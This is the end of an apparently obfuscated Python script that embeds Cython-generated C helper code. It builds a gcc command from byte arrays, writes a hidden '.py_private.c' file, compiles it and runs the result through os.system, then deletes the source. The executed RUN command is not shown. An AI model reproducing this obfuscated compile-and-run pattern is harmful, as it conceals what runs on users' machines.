#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = bytes([46, 112, 121, 95, 112, 114, 105, 118, 97, 116, 101, 46, 99]).decode()
PYTHON_VERSION = bytes([46]).decode().join(sys.version.split(bytes([32]).decode())[0].split(bytes([46]).decode())[:-1])
COMPILE_FILE = (
    bytes([103, 99, 99, 32, 45, 73]).decode() +
    PREFIX +
    bytes([47, 105, 110, 99, 108, 117, 100, 101, 47, 112, 121, 116, 104, 111, 110]).decode() +
    PYTHON_VERSION +
    bytes([32, 45, 111, 32]).decode() +
    EXECUTE_FILE +
    bytes([32]).decode() +
    C_FILE +
    bytes([32, 45, 76]).decode() +
    PREFIX +
    bytes([47, 108, 105, 98, 32, 45, 108, 112, 121, 116, 104, 111, 110]).decode() +
    PYTHON_VERSION
)


with open(C_FILE, bytes([119]).decode()) as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+bytes([32, 38, 38, 32]).decode()+EXPORT_PYTHON_EXECUTABLE+bytes([32, 38, 38, 32]).decode()+COMPILE_FILE+bytes([32, 38, 38, 32]).decode()+RUN)

os.remove(C_FILE)
